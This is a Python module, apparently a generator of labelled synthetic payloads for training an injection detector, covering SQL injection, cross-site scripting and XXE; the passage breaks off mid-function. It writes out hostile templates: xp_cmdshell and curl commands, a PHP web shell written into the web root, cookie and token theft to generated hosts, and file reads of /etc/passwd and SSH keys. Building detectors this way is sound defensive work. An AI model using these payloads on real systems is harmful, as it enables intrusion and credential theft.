"""Attack grammars for the six injection categories of the corpus.

Standard library only. Every generator takes a `random.Random`, draws all of
its randomness from it, and returns `(payload_bytes, label_mask)`, so output
is deterministic for a seed.

Each grammar is compositional: an injection context (how the payload leaves
the value it was placed in), a technique, the technique's operands, and an
optional terminator are drawn independently, and the operands themselves come
from generated identifiers, hosts, numbers and paths. The number of distinct
payloads is therefore far larger than any training set, and no category is a
fixed list of strings.

A payload carries the label of its category. It also carries the
`obfuscation` bit when a technique hides its keywords or characters, for
example with a double percent-encoding, a `%u` escape, an overlong UTF-8
escape, or a shell glob that spells a command. A single layer of transport
encoding, such as `%2e%2e%2f`, does not add that bit.

The payloads are training data for a detector. They are short synthetic
strings in the textbook forms of each category and are not working exploits
for any particular system.
"""

from __future__ import annotations

import base64
import functools
import random
import re
from typing import Callable, List, Sequence, Tuple

import benign

M_MALFORMED = 1 << 0
M_OBFUSCATION = 1 << 1
M_SQL = 1 << 2
M_MARKUP = 1 << 3
M_PATH = 1 << 4
M_CMD = 1 << 5
M_TEMPLATE = 1 << 6
M_HEADER = 1 << 7

Payload = Tuple[bytes, int]

_LOWER = "abcdefghijklmnopqrstuvwxyz"
_HEX = "0123456789abcdef"


# --------------------------------------------------------------------------
# Shared pools and small generators
# --------------------------------------------------------------------------

TABLES = [
    "users", "accounts", "members", "customers", "orders", "sessions",
    "products", "items", "payments", "tokens", "logins", "admin", "admins",
    "credentials", "profiles", "employees", "invoices", "wp_users",
    "user_data", "auth", "clients", "cards", "secrets", "api_keys",
    "staff", "passwords", "people", "tbl_user", "sys_user", "app_users",
    "transactions", "config", "settings", "audit_log", "messages",
]
COLUMNS = [
    "id", "username", "password", "passwd", "email", "token", "name",
    "role", "is_admin", "created_at", "hash", "salt", "ssn", "card_no",
    "first_name", "last_name", "api_key", "secret", "balance", "pin",
    "user", "pass", "login", "pwd", "user_name", "password_hash", "otp",
    "phone", "address", "status", "uid", "group_id", "credit_card",
]
SCHEMA_TABLES = [
    "information_schema.tables", "information_schema.columns",
    "information_schema.schemata", "mysql.user", "sqlite_master",
    "pg_catalog.pg_tables", "pg_user", "pg_shadow", "sys.tables",
    "sys.objects", "master..sysdatabases", "sysobjects", "all_tables",
    "user_tables", "all_users", "dba_users", "v$version",
]
SQL_INFO = [
    "version()", "@@version", "user()", "current_user", "database()",
    "schema()", "system_user()", "session_user", "@@datadir", "@@hostname",
    "db_name()", "user_name()", "banner", "sqlite_version()",
    "current_database()", "inet_server_addr()", "@@servername",
]

SENSITIVE_FILES = [
    "etc/passwd", "etc/shadow", "etc/hosts", "etc/group", "etc/issue",
    "etc/hostname", "etc/crontab", "etc/sudoers", "etc/fstab", "etc/resolv.conf",
    "etc/mysql/my.cnf", "etc/ssh/sshd_config", "etc/nginx/nginx.conf",
    "etc/apache2/apache2.conf", "etc/httpd/conf/httpd.conf", "etc/php.ini",
    "proc/self/environ", "proc/self/cmdline", "proc/self/status",
    "proc/version", "proc/self/fd/0", "proc/1/environ", "proc/net/tcp",
    "var/log/auth.log", "var/log/apache2/access.log", "var/log/nginx/error.log",
    "var/log/syslog", "var/www/html/config.php", "var/www/html/index.php",
    "var/run/secrets/kubernetes.io/serviceaccount/token",
    "root/.ssh/id_rsa", "root/.bash_history", "root/.aws/credentials",
    "home/user/.bash_history", "home/ubuntu/.ssh/authorized_keys",
    "home/app/.env", "home/admin/.ssh/id_ed25519", "root/.docker/config.json",
    "root/.kube/config", "usr/local/etc/php/php.ini",
    "windows/win.ini", "windows/system.ini", "windows/system32/drivers/etc/hosts",
    "boot.ini", "windows/system32/config/sam", "windows/repair/sam",
    "windows/panther/unattend.xml", "inetpub/wwwroot/web.config",
    "windows/debug/netsetup.log", "inetpub/logs/logfiles/w3svc1/u_ex.log",
    "app/config/database.yml", ".env", ".git/config", ".git/HEAD",
    ".htaccess", ".htpasswd", "web.config", "wp-config.php",
    "config/secrets.yml", "WEB-INF/web.xml", "META-INF/MANIFEST.MF",
    "application.properties", "config/settings.py", "appsettings.json",
    "config/database.php", "storage/logs/laravel.log", ".ssh/id_rsa",
]
WINDOWS_FILES = [
    "windows\\win.ini", "windows\\system.ini", "boot.ini",
    "windows\\system32\\drivers\\etc\\hosts", "windows\\system32\\config\\sam",
    "windows\\repair\\sam", "inetpub\\wwwroot\\web.config",
    "windows\\panther\\unattend.xml", "users\\administrator\\ntuser.dat",
    "windows\\system32\\inetsrv\\config\\applicationhost.config",
    "programdata\\mysql\\my.ini", "xampp\\apache\\conf\\httpd.conf",
]

PARAM_NAMES = benign.PARAM_NAMES  # one pool shared by benign and attack carriers


def rand_ident(rng: random.Random, lo: int = 3, hi: int = 10) -> str:
    n = rng.randint(lo, hi)
    return "".join(rng.choice(_LOWER) for _ in range(n))


def rand_word(rng: random.Random) -> str:
    """An identifier drawn from the benign vocabulary or generated."""
    if rng.random() < 0.5:
        return benign.ident(rng)
    return rand_ident(rng, 3, 9)


def rand_table(rng: random.Random) -> str:
    r = rng.random()
    if r < 0.55:
        return rng.choice(TABLES)
    if r < 0.7:
        return rng.choice(("dbo.", "public.", "app.", "main.", "")) + rng.choice(TABLES)
    return rand_ident(rng, 4, 9)


def rand_column(rng: random.Random) -> str:
    if rng.random() < 0.65:
        return rng.choice(COLUMNS)
    return rand_ident(rng, 3, 8)


def rand_host(rng: random.Random) -> str:
    # Neutral host generator shared with benign samples (no attacker-flavoured words).
    return benign.neutral_host(rng)


def rand_hex(rng: random.Random, n: int) -> str:
    return "".join(rng.choice(_HEX) for _ in range(n))


def rand_port(rng: random.Random) -> int:
    return rng.choice((rng.randint(1024, 65535), 4444, 443, 80, 8080, 53, 1337, 9001))


def rand_sensitive_file(rng: random.Random, known: bool = False) -> str:
    """A well-known sensitive file, or 20% of the time a generated path.

    A generated path such as `abc/defg.log` is a traversal target only after
    enough `../` units, so callers pass `known=True` for an absolute reference
    or a shallow traversal, which would otherwise look like a benign path.
    """
    if known or rng.random() < 0.8:
        return rng.choice(SENSITIVE_FILES)
    depth = rng.randint(1, 3)
    name = rand_ident(rng, 3, 8) + rng.choice(("", ".conf", ".php", ".ini", ".log", ".yml", ".key", ".xml"))
    return "/".join(rand_ident(rng, 3, 7) for _ in range(depth)) + "/" + name


def rand_url(rng: random.Random, scheme: str = "") -> str:
    scheme = scheme or rng.choice(("http", "http", "https"))
    host = rand_host(rng)
    if rng.random() < 0.3:
        host += ":%d" % rand_port(rng)
    path = "/" + "/".join(rand_word(rng) for _ in range(rng.randint(0, 2)))
    if rng.random() < 0.4:
        path += rng.choice(("x", "a.js", "s.sh", "x.php", "p.txt", "c", "i.png", "e.xml", "shell"))
    return f"{scheme}://{host}{path}"


def pick(rng: random.Random, weighted: Sequence[Tuple[object, int]]):
    items = [item for item, _ in weighted]
    weights = [weight for _, weight in weighted]
    return rng.choices(items, weights)[0]


def kw(rng: random.Random, word: str) -> str:
    """Randomly cased keyword."""
    r = rng.random()
    if r < 0.45:
        return word.upper()
    if r < 0.75:
        return word.lower()
    if r < 0.88:
        return word.capitalize()
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in word)


def pct_escape(text: str, upper: bool = True) -> str:
    """Percent-escape every reserved byte of `text` once."""
    fmt = "%%%02X" if upper else "%%%02x"
    unreserved = set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~")
    return "".join(chr(c) if c in unreserved else fmt % c for c in text.encode("utf-8"))


# --------------------------------------------------------------------------
# SQL injection
# --------------------------------------------------------------------------

def sql_ws(rng: random.Random) -> str:
    """One unit of SQL whitespace, sometimes a substitute that parsers accept."""
    return pick(rng, ((" ", 14), ("\t", 1), ("\n", 1), ("/**/", 3), ("%20", 2), ("+", 2),
                      ("%09", 1), ("%0a", 1), ("/*%s*/" % rand_ident(rng, 1, 4), 1), ("  ", 1)))


def comment_tail(rng: random.Random) -> str:
    return rng.choice(("-- ", "-- -", "--", "#", "/*", "/**/", ";--", "-- a", "--+", "-- //",
                       ";#", "%23", "--%20", ";", "", "", ""))


_SQL_BREAKOUTS = (
    ("'", 10), ('"', 3), ("", 6), (")", 2), ("')", 3), ("\")", 1), ("'))", 1), ("%'", 1),
    ("`", 1), ("'||'", 1), ("\\'", 1), ("1'", 3), ("1\"", 1), ("1)", 1), ("-1'", 1),
)


def _sql_breakout(rng: random.Random) -> str:
    quote = pick(rng, _SQL_BREAKOUTS)
    if rng.random() < 0.35 and quote and not quote[0].isdigit():
        quote = rng.choice((rand_word(rng), str(rng.randint(1, 9999)), "admin", "test", "x")) + quote
    return quote


def _sql_scalar(rng: random.Random) -> str:
    r = rng.random()
    if r < 0.3:
        return str(rng.randint(0, 99))
    if r < 0.5:
        q = rng.choice(("'", '"'))
        v = rng.choice(("1", "a", "x", rand_ident(rng, 1, 4)))
        return q + v + q
    if r < 0.6:
        return "0x" + rand_hex(rng, rng.choice((2, 4, 8)))
    if r < 0.7:
        return f"{kw(rng, 'char')}({rng.randint(48, 122)})"
    if r < 0.8:
        return rng.choice(("true", "TRUE", "null", "NULL"))
    if r < 0.9:
        return f"{kw(rng, 'ascii')}('{rng.choice(_LOWER)}')"
    return f"({kw(rng, 'select')} {rng.randint(0, 9)})"


def _sql_condition(rng: random.Random, W: Callable[[], str]) -> str:
    """A condition that is always or never true."""
    shape = rng.randint(0, 8)
    if shape == 0:
        a = _sql_scalar(rng)
        return f"{a}{rng.choice(('=', ' = ', '='))}{a}"
    if shape == 1:
        n = rng.randint(1, 99)
        m = n if rng.random() < 0.6 else rng.randint(100, 200)
        return f"{n}={m}"
    if shape == 2:
        a, b = rng.randint(1, 50), rng.randint(51, 99)
        return rng.choice((f"{b}>{a}", f"{a}<{b}", f"{a}<>{b}", f"{a}!={b}"))
    if shape == 3:
        v = rand_ident(rng, 1, 3)
        return f"'{v}'{W()}{kw(rng, 'like')}{W()}'{v}%'" if rng.random() < 0.5 else f"'{v}'{W()}{kw(rng, 'like')}{W()}'{v}'"
    if shape == 4:
        n = rng.randint(1, 9)
        return f"{n}{W()}{kw(rng, 'between')}{W()}{n - 1}{W()}{kw(rng, 'and')}{W()}{n + 1}"
    if shape == 5:
        v = rand_ident(rng, 1, 3)
        return f"'{v}'{W()}{kw(rng, 'in')}{W()}('{v}')"
    if shape == 6:
        return rng.choice((kw(rng, "true"), f"{kw(rng, 'not')}{W()}{kw(rng, 'false')}", "1", f"{kw(rng, 'not')} 0"))
    if shape == 7:
        c = rng.choice(_LOWER)
        return f"{kw(rng, 'ascii')}('{c}')={ord(c)}"
    return f"{kw(rng, 'length')}({kw(rng, rng.choice(('user', 'database', 'version')))}())>{rng.randint(0, 5)}"


def _sql_subquery(rng: random.Random, W: Callable[[], str]) -> str:
    col = rng.choice((rand_column(rng), rng.choice(SQL_INFO), "table_name", "column_name", "name"))
    src = rand_table(rng) if rng.random() < 0.6 else rng.choice(SCHEMA_TABLES)
    s = f"{kw(rng, 'select')}{W()}{col}{W()}{kw(rng, 'from')}{W()}{src}"
    if rng.random() < 0.4:
        s += f"{W()}{kw(rng, 'where')}{W()}{rand_column(rng)}={_sql_scalar(rng)}"
    if rng.random() < 0.4:
        s += rng.choice((f"{W()}{kw(rng, 'limit')}{W()}{rng.randint(0, 3)}", f"{W()}{kw(rng, 'limit')}{W()}{rng.randint(0, 3)},1",
                         f"{W()}{kw(rng, 'offset')}{W()}{rng.randint(0, 3)}", f"{W()}{kw(rng, 'rownum')}=1"))
    return s


def _sql_union_column(rng: random.Random) -> str:
    return pick(rng, (
        ("NULL", 8), (str(rng.randint(1, 20)), 4), ("0x" + rand_hex(rng, 4), 1), (rand_column(rng), 3),
        (rng.choice(SQL_INFO), 3),
        (f"{kw(rng, 'concat')}({rand_column(rng)},0x3a,{rand_column(rng)})", 2),
        (f"{kw(rng, 'group_concat')}({rng.choice(('table_name', 'column_name', rand_column(rng)))})", 2),
        (f"{rand_column(rng)}||':'||{rand_column(rng)}", 1),
        (f"{kw(rng, 'string_agg')}({rand_column(rng)},',')", 1),
        (f"{kw(rng, 'load_file')}('/{rand_sensitive_file(rng)}')", 1),
        ("'" + rand_ident(rng, 1, 6) + "'", 1),
    ))


def _sql_time_function(rng: random.Random) -> str:
    n = rng.randint(1, 20)
    return pick(rng, (
        (f"{kw(rng, 'sleep')}({n})", 5),
        (f"{kw(rng, 'pg_sleep')}({n})", 3),
        (f"{kw(rng, 'waitfor')} {kw(rng, 'delay')} '0:0:{n}'", 3),
        (f"{kw(rng, 'dbms_pipe.receive_message')}(('{rng.choice(_LOWER)}'),{n})", 2),
        (f"{kw(rng, 'benchmark')}({rng.randint(1000000, 9000000)},{kw(rng, rng.choice(('md5', 'sha1')))}({rng.randint(1, 9)}))", 2),
        (f"{kw(rng, 'randomblob')}({rng.randint(100000000, 900000000)})", 1),
        (f"({kw(rng, 'select')} {kw(rng, 'sleep')}({n}))", 2),
        (f"{kw(rng, 'if')}({_sql_scalar(rng)}={_sql_scalar(rng)},{kw(rng, 'sleep')}({n}),0)", 2),
        (f"{kw(rng, 'case')} {kw(rng, 'when')} 1=1 {kw(rng, 'then')} {kw(rng, 'pg_sleep')}({n}) {kw(rng, 'else')} {kw(rng, 'pg_sleep')}(0) {kw(rng, 'end')}", 1),
    ))


def gen_sql(rng: random.Random) -> Payload:
    W = lambda: sql_ws(rng)  # noqa: E731
    s = _sql_breakout(rng)
    numeric = not s or s[-1].isdigit() or s[-1] == ")"
    logic = lambda: kw(rng, rng.choice(("or", "or", "and", "||", "&&", "xor")))  # noqa: E731
    flavor = pick(rng, (
        ("taut", 6), ("union", 6), ("stacked", 4), ("time", 4), ("bool", 4), ("error", 3),
        ("oob", 1), ("order", 2), ("auth", 2), ("file", 1), ("having", 1), ("subquery", 2),
    ))
    if flavor == "taut":
        s += f"{W()}{logic()}{W()}{_sql_condition(rng, W)}"
    elif flavor == "union":
        cols = ",".join(_sql_union_column(rng) for _ in range(rng.randint(1, 8)))
        mode = rng.choice(("", "", f"{kw(rng, 'all')}{W()}", f"{kw(rng, 'distinct')}{W()}"))
        s += f"{W()}{kw(rng, 'union')}{W()}{mode}{kw(rng, 'select')}{W()}{cols}"
        if rng.random() < 0.6:
            s += f"{W()}{kw(rng, 'from')}{W()}{rand_table(rng) if rng.random() < 0.6 else rng.choice(SCHEMA_TABLES)}"
            if rng.random() < 0.3:
                s += f"{W()}{kw(rng, 'where')}{W()}{rng.choice(('table_schema', 'table_name', rand_column(rng)))}={_sql_scalar(rng)}"
    elif flavor == "stacked":
        t = rand_table(rng)
        stmt = pick(rng, (
            (f"{kw(rng, 'drop')}{W()}{kw(rng, 'table')}{W()}{t}", 3),
            (f"{kw(rng, 'delete')}{W()}{kw(rng, 'from')}{W()}{t}", 2),
            (f"{kw(rng, 'truncate')}{W()}{kw(rng, 'table')}{W()}{t}", 1),
            (f"{kw(rng, 'update')}{W()}{t}{W()}{kw(rng, 'set')}{W()}{rand_column(rng)}={_sql_scalar(rng)}", 2),
            (f"{kw(rng, 'insert')}{W()}{kw(rng, 'into')}{W()}{t}{W()}{kw(rng, 'values')}({_sql_scalar(rng)},{_sql_scalar(rng)})", 2),
            (f"{kw(rng, 'exec')}{W()}{kw(rng, 'master..xp_cmdshell')}{W()}'{rng.choice(('whoami', 'dir', 'ping ' + rand_host(rng), 'net user'))}'", 2),
            (f"{kw(rng, 'exec')}{W()}{kw(rng, 'sp_configure')}{W()}'{rng.choice(('show advanced options', 'xp_cmdshell'))}',1", 1),
            (f"{kw(rng, 'shutdown')}", 1),
            (f"{kw(rng, 'create')}{W()}{kw(rng, 'user')}{W()}{rand_ident(rng, 3, 8)}", 1),
            (f"{kw(rng, 'grant')}{W()}{kw(rng, 'all')}{W()}{kw(rng, 'privileges')}{W()}{kw(rng, 'on')} *.* {kw(rng, 'to')} '{rand_ident(rng, 3, 8)}'", 1),
            (f"{kw(rng, 'declare')} @{rand_ident(rng, 1, 4)} {kw(rng, 'varchar')}({rng.randint(8, 4000)})", 1),
            (f"{kw(rng, 'copy')} ({_sql_subquery(rng, W)}) {kw(rng, 'to')} {kw(rng, 'program')} '{rng.choice(('id', 'curl ' + rand_url(rng)))}'", 1),
            (f"{kw(rng, 'select')}{W()}{kw(rng, rng.choice(('pg_sleep', 'sleep')))}({rng.randint(2, 20)})", 1),
        ))
        s += f";{W()}{stmt}" if rng.random() < 0.8 else f"; {stmt}"
    elif flavor == "time":
        s += f"{W()}{logic()}{W()}{_sql_time_function(rng)}"
        if rng.random() < 0.3:
            s = (rng.choice(("", "1")) + rng.choice((";", "';", ");"))) + f"{W()}{_sql_time_function(rng)}"
    elif flavor == "bool":
        fn = rng.choice(("substring", "substr", "mid"))
        target = f"({_sql_subquery(rng, W)})" if rng.random() < 0.6 else rng.choice(SQL_INFO)
        probe = rng.choice((
            f"{kw(rng, fn)}({target},{rng.randint(1, 30)},1)='{rng.choice(_LOWER)}'",
            f"{kw(rng, 'ascii')}({kw(rng, fn)}({target},{rng.randint(1, 30)},1))>{rng.randint(32, 126)}",
            f"{kw(rng, 'length')}({target})>{rng.randint(1, 40)}",
            f"{kw(rng, 'ord')}({kw(rng, 'mid')}({target},{rng.randint(1, 30)},1))<{rng.randint(32, 126)}",
            f"({kw(rng, 'select')} {kw(rng, 'count')}(*) {kw(rng, 'from')} {rand_table(rng)})>{rng.randint(0, 99)}",
            f"{kw(rng, 'exists')}({_sql_subquery(rng, W)})",
            _sql_condition(rng, W),
        ))
        s += f"{W()}{kw(rng, rng.choice(('and', 'and', 'or')))}{W()}{probe}"
    elif flavor == "error":
        sub = _sql_subquery(rng, W)
        s += f"{W()}{logic()}{W()}" + rng.choice((
            f"{kw(rng, 'extractvalue')}(1,{kw(rng, 'concat')}(0x7e,({sub})))",
            f"{kw(rng, 'updatexml')}(1,{kw(rng, 'concat')}(0x7e,{rng.choice(SQL_INFO)}),1)",
            f"(SELECT 1 FROM(SELECT COUNT(*),{kw(rng, 'concat')}({rng.choice(SQL_INFO)},{kw(rng, 'floor')}({kw(rng, 'rand')}(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            f"{kw(rng, 'cast')}(({sub}) {kw(rng, 'as')} {kw(rng, rng.choice(('int', 'numeric', 'integer')))})",
            f"1={kw(rng, 'convert')}({kw(rng, 'int')},({sub}))",
            f"{kw(rng, 'exp')}(~({sub}))",
            f"{kw(rng, 'ctxsys.drithsx.sn')}(1,({sub}))",
            f"{kw(rng, 'xmltype')}('<:'||({sub})||'>')",
            f"{kw(rng, 'gtid_subset')}({rng.choice(SQL_INFO)},1)",
            f"1/0",
        ))
    elif flavor == "oob":
        host = rand_host(rng)
        sub = _sql_subquery(rng, W)
        s += f"{W()}{logic()}{W()}" + rng.choice((
            f"({kw(rng, 'select')} {kw(rng, 'load_file')}({kw(rng, 'concat')}('\\\\\\\\',({sub}),'.{host}\\\\a')))",
            f"{kw(rng, 'utl_http.request')}('http://{host}/'||({sub}))",
            f"{kw(rng, 'utl_inaddr.get_host_address')}(({sub})||'.{host}')",
        )) if rng.random() < 0.7 else (
            f";{W()}{kw(rng, 'exec')} master..xp_dirtree '\\\\{host}\\{rand_ident(rng, 1, 5)}'"
        )
    elif flavor == "order":
        s += f"{W()}{kw(rng, rng.choice(('order', 'group')))}{W()}{kw(rng, 'by')}{W()}{rng.randint(1, 30)}"
    elif flavor == "auth":
        s = rng.choice(("admin", "administrator", "root", rand_word(rng), "user")) + rng.choice(("'", '"', "')"))
        s += rng.choice(("", f"{W()}{logic()}{W()}{_sql_condition(rng, W)}"))
    elif flavor == "file":
        if rng.random() < 0.5:
            s += f"{W()}{kw(rng, 'union')}{W()}{kw(rng, 'select')}{W()}'{rng.choice(('<?php system($_GET[c]); ?>', rand_ident(rng, 3, 8)))}'{W()}{kw(rng, 'into')}{W()}{kw(rng, rng.choice(('outfile', 'dumpfile')))}{W()}'/var/www/html/{rand_ident(rng, 1, 6)}.php'"
        else:
            s += f"{W()}{kw(rng, 'union')}{W()}{kw(rng, 'select')}{W()}{kw(rng, 'load_file')}('/{rand_sensitive_file(rng)}')"
    elif flavor == "having":
        s += f"{W()}{kw(rng, 'having')}{W()}{_sql_condition(rng, W)}"
    else:  # subquery comparison
        s += f"{W()}{logic()}{W()}({_sql_subquery(rng, W)}){rng.choice(('=', '>', '<', ' like '))}{_sql_scalar(rng)}"
    if not numeric and rng.random() < 0.25:
        # Balance the trailing quote instead of commenting it out.
        q = s[0] if s[0] in "'\"" else "'"
        s += f"{W()}{kw(rng, rng.choice(('and', 'or')))}{W()}{q}{rng.choice(('1', 'a', 'x'))}{q}={q}{rng.choice(('1', 'a', 'x'))}"
    else:
        s += comment_tail(rng)
    mask = M_SQL
    if "%" in s and _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


def _has_double_escape(s: str) -> bool:
    return "%25" in s


# --------------------------------------------------------------------------
# Markup injection (cross-site scripting, HTML and XML injection)
# --------------------------------------------------------------------------

_EVENTS = (
    "onerror", "onload", "onfocus", "onmouseover", "onclick", "ontoggle", "onbegin",
    "onanimationstart", "onanimationend", "ontransitionend", "onpointerover",
    "onpointerenter", "onpointerdown", "onmouseenter", "onmousedown", "onauxclick",
    "onwheel", "onscroll", "onblur", "oninput", "onchange", "onkeydown", "onkeyup",
    "oncopy", "onpaste", "oncut", "ondrag", "ondragstart", "ondrop", "onbeforeprint",
    "onafterprint", "onhashchange", "onpageshow", "onpopstate", "onresize",
    "onstart", "onfinish", "onplay", "oncanplay", "onloadstart", "onsubmit",
    "onfocusin", "onselect", "oncontextmenu", "ondblclick", "onmessage",
)
_EVENT_TAGS = (
    "img", "svg", "body", "input", "details", "video", "audio", "iframe", "select",
    "textarea", "marquee", "div", "a", "button", "form", "object", "embed", "style",
    "x", "image", "frameset", "keygen", "isindex", "source", "track", "picture",
    "table", "td", "span", "p", "h1", "xss", "custom-tag",
)
_EXTRA_ATTRS = {
    "img": ("src=x", "src=/", "src=data:,", "src=//0"),
    "input": ("autofocus", "type=image src=x", "type=text autofocus", "value=x"),
    "details": ("open",),
    "video": ("src=x", "autoplay"),
    "audio": ("src=x", "autoplay"),
    "iframe": ("src=x", "srcdoc=x"),
    "select": ("autofocus",),
    "textarea": ("autofocus",),
    "a": ("href=#", "id=x tabindex=1"),
    "div": ("id=x tabindex=1", "style=animation-name:x", "contenteditable"),
    "button": ("autofocus",),
    "body": ("",),
    "svg": ("",),
}


def _js_call(rng: random.Random) -> str:
    """A JavaScript expression that proves execution or exfiltrates."""
    n = rng.randint(0, 999)
    host = rand_host(rng)
    return pick(rng, (
        (f"alert({rng.choice((str(n), 'document.domain', 'document.cookie', 'origin', 'window.origin', '1', '/x/'))})", 8),
        (f"{rng.choice(('prompt', 'confirm', 'print', 'console.log'))}({rng.choice((str(n), 'document.domain', '1', ''))})", 3),
        ("alert`1`", 1),
        (f"fetch('//{host}/?c='+document.cookie)", 2),
        (f"new Image().src='//{host}/'+document.cookie", 2),
        (f"location='//{host}/?'+document.cookie", 1),
        (f"document.location='http://{host}/c?'+escape(document.cookie)", 1),
        (f"navigator.sendBeacon('//{host}',localStorage.token)", 1),
        (f"eval(atob('{base64.b64encode(('alert(%d)' % n).encode()).decode()}'))", 2),
        (f"setTimeout('alert({n})')", 1),
        (f"Function('alert({n})')()", 1),
        (f"top['al'+'ert']({n})", 1),
        (f"window['ale'+'rt'](document.domain)", 1),
        (f"import('//{host}/m.js')", 1),
        (f"document.write('<script src=//{host}/x.js></script>')", 1),
        (f"with(document)body.appendChild(createElement('script')).src='//{host}/x'", 1),
        ("[].constructor.constructor('alert(1)')()", 1),
        (f"window.onerror=alert;throw {n}", 1),
        (f"self[`al`+`ert`]({n})", 1),
    ))


def _attr_sep(rng: random.Random) -> str:
    return pick(rng, ((" ", 12), ("/", 3), ("\t", 1), ("\n", 1), ("%0a", 1), ("%09", 1), ("/x/", 1), ("  ", 1)))


def _quote_attr(rng: random.Random, value: str) -> str:
    q = rng.choice(("", "", '"', "'", "`"))
    if q == "`" and "`" in value:
        q = ""
    if q == "" and (" " in value):
        q = '"'
    if q and q in value:
        q = '"' if q == "'" else "'"
        if q in value:
            q = ""
    return f"{q}{value}{q}"


def _markup_breakout(rng: random.Random) -> str:
    return pick(rng, (
        ("", 10), ('">', 4), ("'>", 3), ('"', 1), ("'", 1), ('"/>', 1), ("</title>", 1),
        ("</textarea>", 1), ("</script>", 1), ("-->", 1), ("]]>", 1), ("</style>", 1),
        ("'\">", 2), ("</noscript>", 1), ("\">'>", 1), ("</option></select>", 1), ("</iframe>", 1),
    ))


def gen_markup(rng: random.Random) -> Payload:
    js = _js_call(rng)
    flavor = pick(rng, (
        ("script", 5), ("event", 9), ("jsurl", 3), ("attr_breakout", 3), ("js_string", 3),
        ("iframe", 2), ("data", 2), ("xxe", 3), ("svg_anim", 2), ("meta", 1), ("css", 2),
        ("form", 1), ("base", 1), ("object", 1), ("math", 1), ("template_tag", 1), ("polyglot", 1),
    ))
    prefix = _markup_breakout(rng)
    sep = _attr_sep(rng)
    if flavor == "script":
        tag = kw(rng, "script")
        attrs = rng.choice(("", "", f" src={_quote_attr(rng, '//' + rand_host(rng) + '/' + rand_ident(rng, 1, 5) + '.js')}",
                            " type=text/javascript", " type=module", " async", " defer", " nonce=" + rand_hex(rng, 8)))
        if "src=" in attrs and rng.random() < 0.6:
            s = f"<{tag}{attrs}></{kw(rng, 'script')}>"
        else:
            s = f"<{tag}{attrs}>{js}</{kw(rng, 'script')}>"
            if rng.random() < 0.1:
                s = f"<{tag}{attrs}>{js}"  # unclosed
    elif flavor == "event":
        tag = rng.choice(_EVENT_TAGS)
        extras = _EXTRA_ATTRS.get(tag, ("",))
        extra = rng.choice(extras)
        handler = rng.choice(_EVENTS)
        if tag in ("img", "video", "audio", "image", "source", "input") and rng.random() < 0.6:
            handler = rng.choice(("onerror", "onload"))
        hs = handler if rng.random() < 0.7 else kw(rng, handler)
        parts = [kw(rng, tag)]
        if extra:
            parts.append(extra)
        attrs = parts[1:] + [f"{hs}={_quote_attr(rng, js)}"]
        if rng.random() < 0.3:
            rng.shuffle(attrs)
        parts = parts[:1] + attrs
        s = "<" + sep.join(parts) + rng.choice((">", ">", "", "//", " />"))
        if rng.random() < 0.2:
            s += f"</{tag}>"
    elif flavor == "jsurl":
        scheme = pick(rng, (("javascript", 8), ("JaVaScRiPt", 1), ("java\tscript", 1), ("javascript%3a", 0),
                            (" javascript", 1), ("javascript&colon;", 1), ("vbscript", 1)))
        body = js if scheme != "vbscript" else "msgbox(1)"
        url = f"{scheme}:{body}" if not scheme.endswith(";") else f"{scheme}{body}"
        s = rng.choice((url, url, f"<a href={_quote_attr(rng, url)}>{rand_word(rng)}</a>",
                        f"<a{sep}href={_quote_attr(rng, url)}>", f"<form action={_quote_attr(rng, url)}><button>x</button></form>"))
    elif flavor == "attr_breakout":
        q = rng.choice(('"', "'", ""))
        handler = rng.choice(_EVENTS[:20])
        s = rng.choice((
            f"{q}{sep}{handler}={js}{sep}{q}",
            f"{q}{sep}autofocus{sep}onfocus={js}{sep}x={q}",
            f"{q}{sep}style={q}animation-name:rotation{q}{sep}onanimationstart={js}{sep}{q}",
            f"{q}><{kw(rng, 'img')}{sep}src=x{sep}onerror={js}>",
            f"{q}><{kw(rng, 'script')}>{js}</{kw(rng, 'script')}>",
            f"{q}><{kw(rng, 'svg')}{sep}onload={js}>",
        ))
        prefix = ""
    elif flavor == "js_string":
        q = rng.choice(("'", '"', "`"))
        s = rng.choice((
            f"{q};{js};//", f"{q}-{js}-{q}", f"{q}+{js}+{q}", f"\\{q};{js}//", f"{q});{js};//",
            f"</script><script>{js}</script>", f"{q}}};{js};{{{q}", f"${{{js}}}", f"{q}||{js}||{q}",
        ))
        prefix = ""
    elif flavor == "iframe":
        src = rng.choice((f"javascript:{js}", f"data:text/html,<script>{js}</script>", rand_url(rng)))
        attr = rng.choice(("src", "src", "srcdoc"))
        if attr == "srcdoc":
            src = f"<script>{js}</script>" if rng.random() < 0.5 else f"&lt;img src=x onerror={js}&gt;"
        s = f"<{kw(rng, 'iframe')}{sep}{attr}={_quote_attr(rng, src)}>" + rng.choice(("", f"</{kw(rng, 'iframe')}>"))
    elif flavor == "data":
        mime = rng.choice(("text/html", "text/html", "image/svg+xml", "application/xhtml+xml", "text/xml"))
        payload = f"<script>{js}</script>" if mime == "text/html" else f"<svg xmlns='http://www.w3.org/2000/svg' onload='{js}'/>"
        if rng.random() < 0.5:
            s = f"data:{mime};base64," + base64.b64encode(payload.encode()).decode()
        else:
            s = f"data:{mime},{payload}"
        if rng.random() < 0.4:
            s = rng.choice((f"<{kw(rng, 'object')} data={_quote_attr(rng, s)}>", f"<{kw(rng, 'embed')} src={_quote_attr(rng, s)}>",
                            f"<a href={_quote_attr(rng, s)}>x</a>"))
    elif flavor == "xxe":
        ent = rand_ident(rng, 2, 5)
        root = rand_ident(rng, 3, 6)
        tgt = pick(rng, ((f"file:///{rand_sensitive_file(rng)}", 6), (rand_url(rng), 3),
                         (f"php://filter/convert.base64-encode/resource=/{rand_sensitive_file(rng)}", 1),
                         (f"expect://{rng.choice(('id', 'whoami'))}", 1), (f"jar:{rand_url(rng)}!/x", 1),
                         ("file:///c:/windows/win.ini", 1), (f"netdoc:///{rand_sensitive_file(rng)}", 1)))
        decl = rng.choice(("<?xml version=\"1.0\"?>", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "", "<?xml version='1.0'?>"))
        kind = rng.randint(0, 4)
        if kind == 0:
            s = f"{decl}<!DOCTYPE {root} [<!ENTITY {ent} SYSTEM \"{tgt}\">]><{root}>&{ent};</{root}>"
        elif kind == 1:
            s = f"{decl}<!DOCTYPE {root} [<!ENTITY % {ent} SYSTEM \"{rand_url(rng)}\"> %{ent};]>"
